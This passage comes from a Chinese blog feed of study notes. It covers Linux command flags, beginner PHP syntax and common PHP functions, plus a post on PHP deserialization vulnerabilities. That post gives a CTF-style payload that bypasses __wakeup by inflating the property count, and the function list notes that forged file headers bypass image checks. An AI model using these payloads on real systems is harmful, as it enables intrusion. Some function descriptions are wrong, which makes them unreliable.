<li><code>-c</code> 创建压缩文件，后面需要写要创建的文件名称，一般后缀是 <code>.tar</code> 。</li>
<li><code>-x</code> 解压缩文件，后面需要写解压后的文件名称。</li>
<li><code>-t</code> 查看压缩包里都有什么文件。</li>
<li><code>-z</code> 使用 Gzip 压缩或者解压，后缀需要是 <code>.tar.gz</code></li>
<li><code>-j</code> 是用 bzip2 压缩或者解压，后缀需要是 <code>tar.bz2</code></li>
<li><code>-v</code> 显示压缩或者解压的过程，强烈推荐使用。</li>
<li><code>-f</code> 需要被压缩或者解压的文件名，需要被放在最后。</li>
<li><code>-p</code> 保留原始的权限与属性。</li>
<li><code>-P</code> 使用绝对路径来压缩。</li>
<li><code>-C</code> 指定解压到的目录。</li>
<li>这些命令可以组合操作，比如 <code>tar -czvf Xorex.tar.gz Xorex</code> 就是将 Xorex 文件夹使用 Gzip 算法压缩成为 Xorex.tar.gz 压缩文件，如果不使用压缩算法，那么就是单纯的打包文件，不进行压缩。</li>
</ul>
</li>
<li><p><code>grep string/expression file</code> 用来对文件的内容进行搜索，非常强大，可以是需要匹配的字符串string或者正则表达式expression，file则是需要匹配的文件或者文件夹！</p>
<ul>
<li><code>-c</code> 显示找到的行数，也就是一共有多少行成功匹配到了关键字符串。</li>
<li><code>-i</code> 匹配时忽略大小写。</li>
<li><code>-n</code> 显示行号。</li>
<li><code>-v</code> 反向选择。</li>
</ul>
</li>
<li><p><code>find</code> 用来查找文件，如果不加任何参数的话，回将当前目录下所有能找到的文件全部列出来。</p>
<ul>
<li><code>-name</code>匹配名称。</li>
<li><code>-perm</code> 匹配权限。</li>
<li><code>-user</code> 匹配所有者。</li>
<li><code>-group</code> 匹配所有组。</li>
<li><code>-mtime -n +n</code> 匹配修改内容的时间，-n表示在n天以内，+n表示n天以前。</li>
<li><code>-atime -n +n</code> 匹配访问内容的时间，-n表示在n天以内，+n表示n天以前。</li>
<li><code>-ctime -n +n</code> 匹配修改文件的权限的时间，-n表示在n天以内，+n表示n天以前。</li>
<li><code>-type b/d/c/p/l/f</code> 匹配文件类型（后面的字幕参数依次表示块设备、目录、字符设备、管道、链接文件、文本文件）</li>
<li><code>-size</code> 匹配文件大小（+50kb表示文件大于，-表示小于）</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP序列化和反序列化</title>
    <url>/2020/11/16/5d3d41825fd8/</url>
    <content><![CDATA[<h2 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a>serialize()</h2><p>php支持将一个数组或者类的<strong>属性</strong>序列化为一个字符串，使用的函数就是 <code>serialize()</code> 函数，如果想要复原可以使用 <code>unserialize()</code> 函数来将一个序列化的字符串还原成原来的类或者数组的状态。</p>
<p>举个例子（来自与<a href="https://home.cnblogs.com/u/anbuxuan/">BuXuan</a>）：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;ghtwf01&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&quot;18&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> test();</span><br><span class="line">    <span class="variable">$a</span>=serialize(<span class="variable">$a</span>);</span><br><span class="line">    print_r(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个test类的变量被序列化并输出之后，会得到这样的一个字符串，这里面只能序列化这个对象里面的各种参数，无法序列化方法：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191112144234-9c15d5ca-0517-1.png" alt="20191112144234-9c15d5ca-0517-1.png (899×409)"></p>
<p>这里需要注意的是，不同类型的变量在使用序列化的时候，是不一样的，PHP的类中的属性类型有三种：<code>public</code> / <code>private</code> / <code>protected</code> 。</p>
<p><strong>public (公共的)</strong> : 在本类内部、外部类、子类都可以访问。<br><strong>protected (受保护的)</strong> : 只有本类或子类或父类中可以访问。<br><strong>private (私人的)</strong> : 只有本类内部可以使用。</p>
<p><strong>public</strong> 类型属性序列化的时候是没有任何变化的。</p>
<p><strong>private</strong> 类型会变成 <code>%00类名属性名%00</code> 而 <code>%00</code> 会占用一个字符的长度，有类名是为了标记这是一个只有在这个类里面使用的私有属性，所以 private类序列化之后的长度往往会变成：属性长度+类名长度+2 .</p>
<p><strong>protected</strong> 类型这会变成 <code>%00*%00属性名</code> ，所以这个长度就会变成 属性名+3 .</p>
<h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a>unserialize()</h2><p>php的 <code>unserialize(str)</code> 函数可以把一段符合序列化的字符串还原成一个类对象，里面只包含类的各种属性。 如果当前代码中有含有和反序列化的类名字相同的类，那么可能会激活 <code>__wakeup()</code> !</p>
<p>无论反序列化的类名字和当前代码的类名字是否相同，都不需要在意里面的属性名字是否需要吻合。如果类名字相同，部分属性名字相同，那么相同部分的属性的值可以共用。</p>
<h2 id="序列化漏洞"><a href="#序列化漏洞" class="headerlink" title="序列化漏洞"></a>序列化漏洞</h2><p>序列化和反序列化不仅仅只是上面的两次转换那么简单，因为在PHP的class类中，有一些魔术方法，这些方法会在class中的各种操作中自动调用，我们就可以利用这些魔术方法在序列化和反序列化的过程中的自动调用，配合着自己精心准备的序列化代码，就可以实现一些神奇的操作。</p>
<ol>
<li><strong>__construct()</strong> 当new一个新的对象时，会自动执行。</li>
<li><strong>__destruct()</strong> 当销毁一个对象时自动执行，程序结束时，所有存活的对象都会被销毁，若有 <strong>__destruct()</strong> 则会自动执行。</li>
<li><strong>__sleep()</strong> 进行序列化的时候，会自动进行。</li>
<li><strong>__wakeup()</strong> 进行反序列化的时候，会自动进行。</li>
<li><strong>__toString()</strong> 当反序列化的数据被输出（被当成字符串）的时候</li>
<li><strong>__call()</strong> 当我们调用类中无法访问的方法（包括没有权限访问和不存在两中可能。）就会自动执行。</li>
<li><strong>__get()</strong> 我们的类中有些属性都是私有的或者被保护的类型，如果在类外面调用这些属性的时候，如果<code>__get()</code> 存在，那么就会自动执行，如果不存在，就会报错。<code>__get()</code> 中和 <code>__call()</code> 中是一样的，最后只需要明确一个返回值（return）给调用时处理就可以了，但是 <code>__get($name)</code> 会自动传入一个 <code>$name</code> 这个数据，为所非法调用属性的名字。</li>
<li><strong>__invoke()</strong> 如果把一个实例对象当作函数调用，那么就会激活这个方法。</li>
</ol>
<p>需要注意的是，当我们使用 <code>unserialize()</code> 反序列化之后，所产生的也是一个新的对象，这个对象被销毁（或程序结束的时候），同样会触发 <code>__destruct()</code> 函数。</p>
<p>我们就可以利用网页代码里面包含的各种魔术方法里面的代码，利用他们的自动执行加上我们序列化的时候精心设计的各种属性的值，然后拿到各种信息。</p>
<h2 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a><strong>__wakeup()</strong></h2><p>这个函数会在数据反序列化的时候，自动执行（前提是网页里对应的类里面含有__wakeup() 方法）</p>
<p>__wakeup()函数的目的一般是为了给反序列化出来的对象进行初始化赋值，但是我们是想用我们自己的属性而不是网页代码给你的初始化值，因此就需要绕过这个函数。而绕过的方法就是在序列化生成的数据中修改里面属性的数量，使其大于实际类中属性的数量，然后系统就会绕过wakeup() 函数的执行，像这样：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;111&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实际生成的序列化数据：<code>O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:7:&quot;hacked!&quot;;&#125;</code></p>
<p>如果我们输入这段序列化数据，那么我们输入的 $flag 的值就会在反序列化的时候被 __wakeup() 函数给 修改覆盖为 “111”，就入侵失败了。</p>
<p>现在我们修改序列化数据的数值，使得其大于类中的属性数量。</p>
<p><code>O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:7:&quot;hacked!&quot;;&#125;</code></p>
<p>这样在传入数据的时候，因为数据中的显示属性是2，那么因为实际上的类中的属性数量是1，冲突了，就会跳过 __wakeup() 的执行，成功传入想要的属性的值。</p>
<h2 id="特殊的PHP6反序列化"><a href="#特殊的PHP6反序列化" class="headerlink" title="特殊的PHP6反序列化"></a>特殊的PHP6反序列化</h2><p>一般来说我们 注意有 S 这个东西，可以绕过一些</p>
<h2 id="注入对象构造方法"><a href="#注入对象构造方法" class="headerlink" title="注入对象构造方法"></a>注入对象构造方法</h2><p>需要注意的是，当我们在传入对象被 <code>private</code> 和 <code>protected</code> 保护的属性的时候，是有特殊的格式的，而在生成序列化字符串的时候因为 %00 不会被显示出来，所以就需要我们在输出的字符串里面加上这些东西。</p>
<p><strong>private</strong> 类型会变成 <code>%00类名%00属性名</code></p>
<p><strong>protected</strong> 类型这会变成 <code>%00*%00属性名</code></p>
<p><strong>这些东西一定要记得加上啊！</strong></p>
<h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h2><p>就和前面的描述的是一样的，<code>__toString()</code> 函数是再这个类被当成字符串使用的时候，定义一下该做一些什么东西。比如下面的代码，当我们输出一个类$a的时候，它就会调用 <code>_toString()</code> 函数返回需要的字符串。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Echo_String</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$in</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;string=<span class="variable">$in</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Echo_string(<span class="string">&#x27;Xorex&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>最后会输出字符串 <code>Xorex</code> ;</p>
<h2 id="call-function-name-function-variable"><a href="#call-function-name-function-variable" class="headerlink" title="__call($function_name,$function_variable)"></a><strong>__call($function_name,$function_variable)</strong></h2><p>对于这个自动方法，在我们引用不可被访问的类中的方法的时候就会执行。</p>
<p>比如我定义的类中方法只有 sing()，jump()，rap()这三个方法，但是你硬要使用方法 basketball(‘run’,’jump’,’shoot’)，那这时如果存在 <code>__call()</code> 函数，那么就会自动执行了。</p>
<p><code>__call</code> 会自动输入两个参数，一个是你非法调用的函数名称 <code>basketball</code> 最为第一个参数，然后回将你调用非法函数时传入的数据 <code>run jump shoot</code> 合并成一个数组作为第二个变量。</p>
]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>PHP</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP常用函数</title>
    <url>/2020/11/16/6be5265b5249/</url>
    <content><![CDATA[<h2 id="PHP（可能）常用函数"><a href="#PHP（可能）常用函数" class="headerlink" title="PHP（可能）常用函数"></a>PHP（可能）常用函数</h2><ol>
<li><code>dirname(filesource)</code></li>
</ol>
<p>用来返回传入的文件路径（filesource）的前面部分（去掉文件路径最后的文件名）</p>
<p>比如输入 <code>D:\Xorex\Waifu\Yukino.jpg</code></p>
<p>那么使用 dirname() 就会返回 <code>D:\Xorex\Waifu</code> </p>
<ol start="2">
<li><code>__file__</code></li>
</ol>
<p>用来返回当前文件的完全路径，比如：<code>D:\Xorex\Waifu\index.php</code> `</p>
<ol start="3">
<li><code>show_source(filesource)</code></li>
</ol>
<p>用来返回传入的文件路径（filesource）里面的文件内容。</p>
<ol start="4">
<li><code>strchr(str_all,str_match)</code></li>
</ol>
<p>传入两个字符串，str_all 是需要被匹配的文本，str_match 是去匹配的关键词，如果匹配成功，返回第一次匹配成功之后的字符串部分，如果失败，返回严格的 <code>FALSE</code></p>
<ol start="5">
<li><code>die(str)</code> &amp; <code>exit()</code></li>
</ol>
<p>输出给定的字符串 str 并终止当前程序。</p>
<ol start="6">
<li><code>preg_match(str_match,str_all)</code></li>
</ol>
<p>执行匹配正则表达式。</p>
<ol start="7">
<li><code>ini_set(str1,str2)</code></li>
</ol>
<p>设置str1选项的参数为：str2 </p>
<ol start="8">
<li><code>array_walk(&lt;array_name&gt;,&lt;function_name&gt;)</code></li>
</ol>
<p>对于数组中的每一组数据，作为参数执行一遍后面的函数。</p>
<ol start="9">
<li><code>unlink(filename)</code></li>
</ol>
<p>删除函数，用来删除文件名为：filename 的文件，成功则返回 true 失败返回 false.</p>
<ol start="10">
<li><code>$_FILES[&#39;filename&#39;][&#39;property&#39;]</code></li>
</ol>
<p>魔术常量，用来返回POST上传的文件的一些信息，其中 filename 为上传的文件名，property 为想要获得的文件属性，包括：</p>
<p>[name] =&gt; 上传的文件名。</p>
<p>[type] =&gt; 上传的文件类型。</p>
<p>[tmp_name] =&gt; 被上传的文件保存的服务器内路径。</p>
<p>[error] =&gt; 0 文件上传状态，如果为0则为上传成功。</p>
<p>[size] =&gt; 文件大小。</p>
<ol start="11">
<li><code>substr(string,start,length)</code></li>
</ol>
<p>用来截取字符串，string 为字符串名称，start 为从哪个位置开始截取，length为可选参数，决定截取字符串的长度，如果不填，则直接截取到字符串最后。</p>
<ol start="12">
<li><code>strrchr(string,char)</code></li>
</ol>
<p>用来匹配 char 字符串在 string 中最后出现的位置并返回。</p>
<ol start="13">
<li><code>imagecreatefromXXX(filename)</code></li>
</ol>
<p>创建一个画布，然后从filename里面载入一个格式为XXX的图像，变成一个新的图像。</p>
<ol start="14">
<li><code>exif_imagetype(filename)</code></li>
</ol>
<p>用来判断一个图像的文件类型，判断方式是提取文件的第一个字符（文件头的第一个字符），然后进行对比。可以在文件开头伪造文件头来绕过检查。</p>
<ol start="15">
<li><code>basename(path,suffix)</code></li>
</ol>
<p>用来返回包含文件名称的路径中，文件的名称，如果 suffix 已经填写，那么返回的就只有文件名，如果 suffix 不写，那么什么都不返回。</p>
<ol start="16">
<li><code>strval(variable)</code></li>
</ol>
<p>传入任意数据（除了数组和对象）返回这个数据的字符串。</p>
<ol start="17">
<li><code>explore(separator,string)</code></li>
</ol>
<p>将一个字符串 string 通过 设定的 分隔符 separator 分割成一个数组，然后返回。比如可以用 <code>.</code>  来分割文件名成一个数组，包括 文件名 和 后缀。</p>
<ol start="18">
<li><code>pathinfo(path)</code></li>
</ol>
<p>填入一个文件的路径，然后返回一个数组，包含这个文件的 <code>dirname</code>，<code>basename</code> 和 <code>extension</code> ，三个键值对。</p>
<ol start="19">
<li><code>array_map(function,array)</code></li>
</ol>
<p>将数组 array 里面的元素作为参数，依次执行 function 。</p>
]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP学习笔记</title>
    <url>/2020/11/16/6373abc82f2a/</url>
    <content><![CDATA[<blockquote>
<p>都说PHP是世界上最好的语言，我今天就要来领教一下，这篇文章主要记录PHP比较奇特的语法。</p>
</blockquote>
<h2 id="大小写问题"><a href="#大小写问题" class="headerlink" title="大小写问题"></a>大小写问题</h2><p>PHP语言中，变量名称是大小写敏感的，而对于函数，方法，类名是大小写不敏感的。</p>
<h2 id="局部变量和全局变量"><a href="#局部变量和全局变量" class="headerlink" title="局部变量和全局变量"></a>局部变量和全局变量</h2><p>PHP的变量首先需要再前面加上资本主义的符号: <code>$</code> ，这样才会被识别为变量，并且它不需要声明，使用方法和Python是一样的。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$X</span>=<span class="number">123456</span>;</span><br><span class="line"><span class="variable">$y</span>=<span class="number">123456</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>+<span class="variable">$y</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里在函数里面声明的局部变量是没有办法被其他函数或者全局命令使用的，但是全局变量可以被各种函数里面使用，但是再函数里面调用全局变量的时候，就需要使用关键词 <strong>global</strong> 才可以。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="number">123</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">text</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="Static作用域"><a href="#Static作用域" class="headerlink" title="Static作用域"></a>Static作用域</h2><p>当我们在函数内部申明了一个局部变量的时候，一旦这个函数执行完毕，那么这个局部变量的内存就会被释放，也就是这个变量消失了。如果你想要记录下来这个局部变量的值来供下次使用，除了使用全局变量以外，还有另外一种更加方便的使用方法，就是在函数内部声明局部变量的时候使用 <strong>static</strong> 语句，这样在第二次调用这个函数的时候，它能保留上一次这个函数里面记录的值，很好的保证了封装性。</p>
<h2 id="echo-语句"><a href="#echo-语句" class="headerlink" title="echo 语句"></a>echo 语句</h2><p>这个东西是PHP的输出语句，和print用法一样，什么都能输出，输出的时候，变量可以加在字符串里面（这大概就是资本主义符号的作用了吧），并且可以同时输出多个变量，加上逗号就可以了，注意同时输出的两个变量：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$name</span>=<span class="string">&quot;Xorex&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;MY name is <span class="subst">$name</span>&quot;</span>,<span class="string">&quot; readlly!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="EOF-字符串"><a href="#EOF-字符串" class="headerlink" title="EOF 字符串"></a>EOF 字符串</h2><p>在Python里面，有一个<code>&#39;&#39;&#39;</code>符号是用来原封不动的保存一个多行字符串，非常方便，PHP里面也有这种功能，不过激活码是：<code>&lt;&lt;&lt;EOF</code> 结束码是：<code>EOF</code></p>
<p>这里面的EOF可以换成其他字符，不过我建议还是使用EOF吧，毕竟 <code>End Of File</code> 挺适合这里的，其次这里面是可以加入变量的，又是资本主义符号的好处。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$KM</span>=<span class="string">&quot;katou Megumi&quot;</span>;</span><br><span class="line"><span class="variable">$name</span>= &lt;&lt;&lt;EOF</span><br><span class="line">Tempest</span><br><span class="line">Xorex</span><br><span class="line"><span class="variable">$KM</span></span><br><span class="line">EOF;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>里面可以解析 <code>THML</code> 的相关符号，比如换行啥的，挺方便。</p>
<h2 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h2><p>这里的IF条件语句和C++的语句使用方法是完全相同的。</p>
<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><ol>
<li><p><strong>字符串(String)：</strong></p>
<p> 单引号双引号均可，可解析<code>HTML</code>元素。</p>
</li>
<li><p><strong>整形(Integer)：</strong></p>
<p> 可以使用十进制，十六进制(0x)，八进制(0) 来赋值运算，不内置高精度。</p>
</li>
<li><p><strong>浮点型(Float)：</strong></p>
<p>和C++的浮点型是一样的，没什么可说的。</p>
</li>
<li><p><strong>布尔型(Boolean)：</strong></p>
<p>使用的是小写的 <code>true</code> 或者 <code>false</code> 。</p>
</li>
<li><p><strong>数组(Array)：</strong></p>
<p>需要使用函数array()来创建一个数组。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="string">&quot;gg&quot;</span>,<span class="number">12312</span>,<span class="literal">false</span>,<span class="number">12312.232</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>[<span class="number">0</span>],<span class="variable">$a</span>[<span class="number">1</span>],<span class="variable">$a</span>[<span class="number">2</span>],<span class="variable">$a</span>[<span class="number">3</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>后面会有更多内容。</p>
</li>
<li><p><strong>对象(Object)：</strong></p>
<p>同样是大家伙，使用的是<code>class</code> 关键字，里面可以声明各种变量和函数，很有面向对象的感觉！</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Xorex</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="variable">$ID</span>=<span class="string">&quot;Tempest Xorex&quot;</span>;</span><br><span class="line">    <span class="variable">$High</span>=<span class="number">185</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jump</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$High</span>+=<span class="number">20</span>;</span><br><span class="line">        <span class="variable">$High</span>-=<span class="number">20</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p><strong>空值(NULL)：</strong></p>
<p>故名思意，就是没有值的意思，可以用来清除变量里的数据：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$Xorex</span>=<span class="string">&quot;Strong&quot;</span>;</span><br><span class="line"><span class="variable">$Xorex</span>=<span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="比较符号"><a href="#比较符号" class="headerlink" title="比较符号"></a>比较符号</h2></li>
</ol>
<p>主要是PHP有两个概念，一个是松散比较：<code>==</code>，一个是严格比较：<code>===</code> 松散比较是不比较类型的，比如1和ture和’1’，0和’0’和NULL和false，在松散比较里都是相等的，但是如果是严格比较，那么必须是同类型才能满足相等，也就是完全相等。</p>
<p>注意的是数组也可以比较是否相等，如果是 <code>==</code> 的话，是比较数组里面是否有相同的键/值对，不需要保证顺序相等就可以返回True，但是如果是 <code>===</code> 的话，就需要键/值对的顺序也要严格的相等了。</p>
<p>同样，<code>!=</code>  是不等于， <code>!==</code> 这种是绝对不等于。其他就没有了。</p>
<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>这里和C++的常量 <code>define</code> 用法是差不多的，具体的格式如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">&quot;Tempest&quot;</span>,<span class="number">123</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">echo</span> Tempest;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>第一个参数是字符串，表使常量名称，不需要资本主义符号，第二个参数是常量的实际数值，可以是任何类型，最后一个可填可不填，默认是true，表示的是常量名称是否大小写敏感。</p>
<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>PHP中字符串的运算只有一种就是：<code>.</code> ，这个点的计算就是将两个字符串连接起来，这种运算适用于所有的变量类型。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$Last_Name</span>=<span class="string">&quot;Tempest&quot;</span>;</span><br><span class="line"><span class="variable">$First_Name</span>=<span class="string">&quot;Xorex&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$First_Name</span> . <span class="string">&quot; &quot;</span> . <span class="variable">$Last_Name</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>里面还有几种比较方便的函数，strlen(string) 可以返回字符串string的字节数（ASCII对应的就是长度），strpos(text,string) 函数，用来匹配text文本里面是否有string文本，如果有的话返回true，如果没有返回false。</p>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>可以使用count(array)函数来返回数组array的长度。</p>
<ol>
<li><strong>数值数组：</strong></li>
</ol>
<p>这个数组和C++中的数组是一样的，只不过在创建的时候需要使用array()函数或者手动下标赋值，使用下标来访问里面存储的元素，可以同时存储不同类型的元素。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2.0</span>);</span><br><span class="line"><span class="variable">$a</span>[<span class="number">2</span>]=<span class="literal">true</span>;</span><br><span class="line"><span class="variable">$a</span>[<span class="number">3</span>]=<span class="string">&quot;hahaha&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>[<span class="number">0</span>],<span class="variable">$a</span>[<span class="number">1</span>],<span class="variable">$a</span>[<span class="number">2</span>],<span class="variable">$a</span>[<span class="number">3</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li><strong>关联数组：</strong></li>
</ol>
<p>关联数组是指带有指定的键的数组，每个键关联一个值，这和Pyhon里面的字典类似，赋值同样有两种：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="string">&quot;Xorex&quot;</span>=&gt;<span class="number">955</span>,<span class="number">12345</span>=&gt;<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$a</span>[<span class="number">8989</span>]=<span class="string">&#x27;Tempest&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>[<span class="number">8989</span>],<span class="variable">$a</span>[<span class="string">&quot;Xorex&quot;</span>],<span class="variable">$a</span>[<span class="number">12345</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>如果遍历关联数组则需要foreach 函数；</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="string">&quot;Xorex&quot;</span>=&gt;<span class="number">955</span>,<span class="number">12345</span>=&gt;<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$a</span>[<span class="number">8989</span>]=<span class="string">&#x27;Tempest&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$x_name</span>=&gt;<span class="variable">$x_value</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Key=&quot;</span> . <span class="variable">$x_name</span> . <span class="string">&quot;, Value=&quot;</span> . <span class="variable">$x_value</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li><strong>多维数组：</strong></li>
</ol>
<p>简单来说就是数组套数组，赋值的时候将一个数组赋值给一个数组的元素就可以了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sites</span> = <span class="keyword">array</span></span><br><span class="line">(</span><br><span class="line">    <span class="string">&quot;runoob&quot;</span>=&gt;<span class="keyword">array</span></span><br><span class="line">    (</span><br><span class="line">        <span class="string">&quot;菜鸟教程&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http://www.runoob.com&quot;</span></span><br><span class="line">    ),</span><br><span class="line">    <span class="string">&quot;google&quot;</span>=&gt;<span class="keyword">array</span></span><br><span class="line">    (</span><br><span class="line">        <span class="string">&quot;Google 搜索&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http://www.google.com&quot;</span></span><br><span class="line">    ),</span><br><span class="line">    <span class="string">&quot;taobao&quot;</span>=&gt;<span class="keyword">array</span></span><br><span class="line">    (</span><br><span class="line">        <span class="string">&quot;淘宝&quot;</span>,</span><br><span class="line">        <span class="string">&quot;http://www.taobao.com&quot;</span></span><br><span class="line">    